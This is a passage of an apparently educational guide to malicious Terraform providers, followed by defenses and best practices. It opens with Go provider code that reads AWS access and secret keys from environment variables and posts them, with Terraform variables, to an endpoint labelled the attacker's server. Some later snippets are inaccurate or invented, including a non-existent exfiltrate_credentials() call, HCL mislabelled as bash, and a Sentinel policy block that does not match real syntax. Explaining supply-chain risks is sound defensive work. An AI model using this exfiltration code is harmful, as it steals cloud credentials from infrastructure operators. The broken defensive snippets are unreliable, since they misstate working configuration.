)

type maliciousProvider struct {
    version string
}

func (p *maliciousProvider) Configure(ctx context.Context, req provider.ConfigureRequest, resp *provider.ConfigureResponse) {
    // This runs during 'terraform init' and 'terraform plan'

    // 1. Read environment variables containing credentials
    awsAccessKey := os.Getenv("AWS_ACCESS_KEY_ID")
    awsSecretKey := os.Getenv("AWS_SECRET_ACCESS_KEY")

    // 2. Read Terraform variables and state
    var config struct {
        DebugEndpoint string `tfsdk:"debug_endpoint"`
    }
    req.Config.Get(ctx, &config)

    // 3. Exfiltrate data
    if config.DebugEndpoint != "" {
        exfilData := map[string]string{
            "aws_access_key": awsAccessKey,
            "aws_secret_key": awsSecretKey,
            "terraform_vars": extractTerraformVars(),
        }

        // Send to attacker's server
        jsonData, _ := json.Marshal(exfilData)
        http.Post(config.DebugEndpoint, "application/json", bytes.NewBuffer(jsonData))
    }
}
```

## Common Attack Vectors

1. **Provider Schema Validation:**
```hcl
provider "malicious" {
  # Malicious provider reads all environment variables during schema validation
  # which happens before any user confirmation
}
```

2. **DataSource During Plan:**
```hcl
data "malicious_provider_metadata" "example" {
  # Data sources can run during 'terraform plan'
  # and could exfiltrate credentials
}
```

3. **Precondition/Postcondition Abuse:**
```hcl
resource "aws_instance" "example" {
  lifecycle {
    precondition {
      # Could call external service with credentials
      condition = can(exfiltrate_credentials())
      error_message = "Check failed"
    }
  }
}
```

## Defense Mechanisms

1. **Provider Signing and Verification:**
```hcl
terraform {
  required_providers {
    aws = {
      source  = "hashicorp/aws"
      version = "~> 5.0"
      # Signed by HashiCorp
    }
  }
}
```

2. **Use Private Registry:**
```bash
# Configure private provider registry
terraform {
  required_providers {
    internal = {
      source = "mycompany.com/private/internal"
    }
  }
}
```

3. **Policy as Code:**
```hcl
# Sentinel policy to block suspicious providers
import "tfplan/v2" as tfplan

policy "restrict-providers" {
  source = "https://registry.terraform.io/v2/policies"

  enforcement_level = "hard-mandatory"
}
```

4. **Credential Management:**
```bash
# Use short-lived credentials
export AWS_SESSION_TOKEN="..."
# Instead of long-term access keys
```

## Best Practices

1. **Always verify provider sources**
2. **Use private/provider registries you control**
3. **Implement Terraform Enterprise/Cloud with policy enforcement**
4. **Monitor network traffic during Terraform operations**
5. **Use role-based access with minimal permissions**
6. **Regularly audit provider code and hashes**

**Important**: This example is for educational purposes only. Always:
- Review provider source code before use
- Use signed providers from trusted sources
- Implement security scanning in your CI/CD pipeline
- Monitor for unexpected network calls during Terraform operations

The Terraform ecosystem relies on trust, making provider security critical. Always follow the principle of least privilege and maintain an allow-list of approved providers in your organization.

